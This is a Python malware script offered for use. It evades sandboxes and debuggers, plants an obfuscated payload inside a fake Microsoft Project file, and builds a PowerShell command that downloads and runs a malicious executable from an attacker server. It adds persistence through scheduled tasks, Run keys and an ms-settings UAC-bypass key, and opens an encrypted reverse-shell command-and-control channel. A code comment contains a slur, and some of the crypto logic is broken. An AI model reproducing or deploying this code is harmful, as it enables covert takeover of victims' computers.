import os
import base64
import platform
import random
import string
import subprocess
import ctypes
import sys
import socket
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

KEY = b'dat-aes-256-encryption-key'  # aes-256 encryption key
IV = os.urandom(16)

def advanced_obfuscate_payload(payload):
    xor_key = 'xor_key123' # replace with xor key
    xor_payload = ''.join(chr(ord(c) ^ ord(xor_key[i % len(xor_key)])) for i, c in enumerate(payload))
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    encrypted_payload = cipher.encrypt(pad(xor_payload.encode('utf-8'), AES.block_size))
    final_payload = base64.b64encode(encrypted_payload[::-1]).decode('utf-8')
    return final_payload

def generate_metamorphic_payload():
    base_payload = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden"
    metamorphic_parts = [
        "Invoke-WebRequest -Uri http://127.0.0.1/malicious.exe", # replace 127.0.0.1 with the attacking server ip
        f"Start-Process C:\\Windows\\Temp\\{random_string(8)}.exe",
        f"Start-Sleep -s {random.randint(1, 5)}"
    ]
    random.shuffle(metamorphic_parts)
    return base_payload + " ; ".join(metamorphic_parts)

def execute_in_memory_advanced():
    payload = generate_metamorphic_payload()
    obfuscated_payload = advanced_obfuscate_payload(payload)
    subprocess.run(f"powershell -enc {obfuscated_payload}", shell=True)

def create_stealth_malicious_project_file(filename):
    try:
        with open(filename, 'wb') as f:
            f.write(b'MSPJ\x00\x00\x00\x01' + os.urandom(550))
            payload = generate_metamorphic_payload()
            obfuscated_payload = advanced_obfuscate_payload(payload)
            script_tag = f"<script>exec(base64.b64decode('{obfuscated_payload}').decode('utf-8'))</script>"
            f.write(script_tag.encode('utf-8') + os.urandom(150))
        print(f"Malicious project file created: {filename}")
    except Exception as e:
        print(f"Failed to create malicious project file: {e}")

def add_stealth_persistence():
    if platform.system() == 'Windows':
        try:
            persistence_cmds = [
                "schtasks /create /sc onlogon /tn 'System Maintenance' /tr 'C:\\path\\to\\malicious.exe' /ru SYSTEM",
                "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v 'WinDefend' /t REG_SZ /d 'C:\\path\\to\\malicious.exe'",
                "powershell -Command \"Start-Process -FilePath 'cmd.exe' -ArgumentList '/c start C:\\path\\to\\malicious.exe' -NoNewWindow\"",
                "powershell -Command \"New-Object -ComObject WScript.Shell\"",
                "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /t REG_SZ /d 'C:\\path\\to\\malicious.exe'"
            ]
            for cmd in persistence_cmds:
                subprocess.run(cmd, shell=True, check=True)
            print("Stealth persistence added successfully.")
        except Exception as e:
            print(f"Failed to add stealth persistence: {e}")

def establish_secure_command_and_control():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('127.0.0.1', 4444)) # replace this with the attacking server ip n port, remember to start that rev shell my migger
        while True:
            command = s.recv(1024)
            decrypted_command = decrypt_command(command)
            if decrypted_command.lower() == "exit":
                break
            output = subprocess.getoutput(decrypted_command)
            s.send(encrypt_output(output))
        s.close()
    except Exception as e:
        print(f"Failed to establish secure C2: {e}")

def decrypt_command(command):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return unpad(cipher.decrypt(command), AES.block_size).decode('utf-8')

def encrypt_output(output):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return cipher.encrypt(pad(output.encode('utf-8'), AES.block_size))

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except AttributeError:
        return False

def random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def detect_virtualization_advanced():
    known_virtual_envs = ['VBOX', 'VMware', 'VirtualBox', 'Xen', 'QEMU', 'Hyper-V']
    try:
        output = subprocess.check_output("wmic baseboard get product,manufacturer", shell=True).decode()
        if any(env in output for env in known_virtual_envs) or is_debugger_present():
            print("Sandbox detected. Exiting.")
            sys.exit(0)
    except Exception as e:
        print(f"Failed to detect sandbox: {e}")

def is_debugger_present():
    return 'OllyDbg' in os.popen('tasklist').read()

detect_virtualization_advanced()
create_stealth_malicious_project_file("exploit.mpp")
add_stealth_persistence()
establish_secure_command_and_control()